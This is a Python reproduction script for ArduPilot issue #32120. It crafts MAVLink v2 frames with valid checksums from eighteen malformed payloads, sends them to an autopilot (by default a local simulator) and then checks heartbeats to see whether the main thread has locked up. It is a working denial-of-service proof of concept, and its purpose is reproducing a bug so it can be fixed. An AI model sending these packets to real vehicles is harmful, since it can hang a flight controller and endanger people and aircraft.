#!/usr/bin/env python3

'''
Reproduce ArduPilot issue #32120 - crafted MAVLink packets causing
the main thread to get caught in a tight loop.

Builds raw MAVLink v2 frames from the exact wire payloads in the
issue and injects them over a connection.

Usage:
    python3 inject_issue_32120.py [connection_string]

    connection_string defaults to tcp:127.0.0.1:5760
'''

import struct
import sys
import time

from pymavlink import mavutil
from pymavlink.generator.mavcrc import x25crc

# All packets from the issue, in order.
# (msg_id, crc_extra, sys_id, comp_id, payload_hex)
PACKETS = [
    (1, 124, 1, 101,
     "65 7F 00 00 00 01 01 E2 80 FF FF"),

    (126, 220, 122, 126,
     "6E A7 7E 7E 11 00 03 E8 A0 A0 A0 A0 A0 A0 A0 A0"
     "A0 A0 A0 A0 63 58 63 63 0C FF F9 61 B7 7F 5B 63"),

    (126, 220, 255, 0,
     "00 05 FF FF 05 1E 02 6E F6 1B D4 05 FF 01 00 10"
     "FC 9D 96 00 80 3F"),

    (126, 220, 141, 125,
     "17 00 00 BE 03 00 64 EA F4 01 8A E2 E0 40 86 E1"
     "11 E0 04 00 AA 00 FE"),

    (126, 220, 2, 2,
     "03 22 02 02 02 F6 02 DC E4 01 23 DE 40 A7 00 02"
     "01 7F 00 F4 FF 00"),

    (126, 220, 0, 21,
     "00 0E 00 05 00 66 66 66 66 00 B8 21 B8 B8 40 80"
     "FF 10 40 40 05"),

    (126, 220, 166, 112,
     "A6 70 36 4A 00 1E 02 06 04 FF F4 0E EF 2C 76 36"
     "6D"),

    (134, 229, 124, 174,
     "22 65 78 65 63 75 74 69 70 6E 73 7B 0A 20 20 22"
     "6D 65 74 61 64 61 74 61 22 3A 20 7B 0A 20 20 20"
     "20 22 6D 61 70 22 22 3A 20 30 20 00 FF 00"),

    (126, 220, 126, 126,
     "00 02 7E 7E 7E 00 02 C8 C7 20 22 00 00 0B B2 0A"
     "0A"),

    (32, 185, 0, 127,
     "FF 20 20 22 6D 65 74 61 64 E1 FD 09 01 FD 16 16"
     "7E 20 7B 7D 0A 20 20 7D 2C 61 75 FF C3 21 DF FD"
     "23 5F 20 20 DF FF 00 09 E1 FD 09 01 FD 16 16 7E"
     "20 7B 7D 26 20 20 7D 2C 0A 20 20 20 20 83 00 97"
     "97 97 20 20 20 20 20 20 00 FF 00"),

    (32, 185, 0, 127,
     "FF 20 20 22 6D 65 74 61 64 61 75 FF C3 21 DF FD"
     "23 5F 20 20 DF FF 00 01 E1 FD 09 01 FD 16 16 7E"
     "7E 00 00 00 00 86 7C AE 22 65 78 65 63 75 74 69"
     "70 6E 73 22 3A 20 30 20 00 FF 00"),

    (126, 220, 105, 105,
     "01 00 10 00 CF 52 64 48 53 53 20 53 53 8E C4 E4"
     "C4 56 53 53 53 40 00 00 00 69 69 69 00 00 01 00"
     "53"),

    (126, 220, 82, 70,
     "FC 48 D7 B9 21 80 65 0E 1A B6 55 C8 C1 DE 79 B2"
     "66 83 29 B9 A1 F2 7F 00 B4 25 00 00 7E 52 83 E5"
     "FC A8 E5 E5 E5"),

    (32, 185, 0, 127,
     "FF 20 20 22 6D 65 74 61 64 61 75 FF C3 21 DF FD"
     "23 5F 20 20 DF FF 00 01 E1 FD 09 01 FD 16 16 7E"
     "7E 00 00 00 00 86 7C AE 32 32 32 00 64 20 20 20"
     "83 00 F4 F4 F4 F4 F4 F4 F4 97 97 97 20 20 20 20"
     "20 20 00 FF 00"),

    (126, 220, 16, 0,
     "00 79 8C 00 00 10 02 A2 BE A2 A2 8C 8C 0C F8 7F"
     "CA 05"),

    (126, 220, 126, 126,
     "00 02 7E 7E 00 02 26 26 26 00 00 00 FF 26 26 26"
     "02 C8 C7 20 31 00 00 0B B2 0A 0A"),

    (126, 220, 126, 10,
     "0A 0A 7E 7E 7E 00 02 C8 C7 20 22 00 FF F9 B2 0A"
     "0A"),

    (126, 220, 0, 0,
     "00 00 00 00 D9 91 02 02 02 02 02 02 02 00 00 00"
     "00 00 22 D9 1C 1C FF 00 00 74 2E 53"),
]


def parse_hex(hex_str):
    '''parse space-separated hex string into bytes'''
    return bytes.fromhex(hex_str.replace(" ", "").replace("\n", ""))


def build_mavlink2_frame(msg_id, payload, sys_id, comp_id, crc_extra, seq=0):
    '''build a complete MAVLink v2 frame with correct CRC'''
    # header bytes (everything after STX)
    header = struct.pack(
        '<BBBBBBBH',
        len(payload),           # payload length
        0,                      # incompatibility flags
        0,                      # compatibility flags
        seq & 0xFF,             # sequence number
        sys_id,                 # system ID
        comp_id,                # component ID
        msg_id & 0xFF,          # msgid low byte
        (msg_id >> 8) & 0xFFFF, # msgid mid+high bytes
    )
    # CRC over header + payload + crc_extra
    crc = x25crc(header)
    crc.accumulate(payload)
    crc.accumulate(struct.pack('B', crc_extra))

    return b'\xFD' + header + payload + struct.pack('<H', crc.crc)


def main():
    connection_string = sys.argv[1] if len(sys.argv) > 1 else 'tcp:127.0.0.1:5760'

    print("Connecting to %s" % connection_string)
    mav = mavutil.mavlink_connection(connection_string)
    mav.wait_heartbeat()
    print("Connected (system %u component %u)" %
          (mav.target_system, mav.target_component))

    seq = 0
    for i, (msg_id, crc_extra, sys_id, comp_id, payload_hex) in enumerate(PACKETS):
        payload = parse_hex(payload_hex)
        frame = build_mavlink2_frame(
            msg_id, payload, sys_id, comp_id, crc_extra, seq)
        seq = (seq + 1) & 0xFF

        print("[%2d] msgid=%3d sys=%3d comp=%3d len=%2d frame=%d bytes" %
              (i, msg_id, sys_id, comp_id, len(payload), len(frame)))

        mav.write(frame)
        time.sleep(0.01)

    print("All %d packets sent" % len(PACKETS))
    print("Monitoring for heartbeats (Ctrl-C to exit)...")

    timeout_start = time.time()
    while time.time() - timeout_start < 10:
        msg = mav.recv_match(type='HEARTBEAT', blocking=True, timeout=2)
        if msg:
            print("  heartbeat received (system alive)")
            timeout_start = time.time()
        else:
            print("  no heartbeat - system may be stuck")


if __name__ == '__main__':
    main()
